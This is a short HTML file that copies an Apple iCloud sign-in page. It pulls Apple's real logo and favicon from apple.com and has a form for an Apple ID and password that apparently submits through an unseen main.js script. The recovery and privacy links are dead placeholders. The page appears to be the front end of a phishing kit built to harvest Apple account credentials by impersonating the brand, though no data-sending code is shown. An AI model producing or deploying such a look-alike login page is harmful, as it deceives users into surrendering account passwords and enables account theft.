<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="https://www.apple.com/favicon.ico">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png" alt="Apple Logo" class="logo">
            <h1>Sign in to iCloud</h1>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="email" name="email" id="email" required placeholder=" ">
                    <label for="email">Apple ID</label>
                </div>
                
                <div class="input-group">
                    <input type="password" name="password" id="password" required placeholder=" ">
                    <label for="password">Password</label>
                </div>
                
                <div class="remember-me">
                    <input type="checkbox" id="keep-signed-in">
                    <label for="keep-signed-in">Keep me signed in</label>
                </div>
                
                <button type="submit">Sign In</button>
            </form>
            
            <div class="links">
                <a href="#">Forgot Apple ID or Password?</a>
                <a href="#">Create Apple ID</a>
                <a href="#">System Status</a>
                <a href="#">Privacy Policy</a>
            </div>
        </div>
    </div>
    <script src="main.js"></script>
</body>
</html>
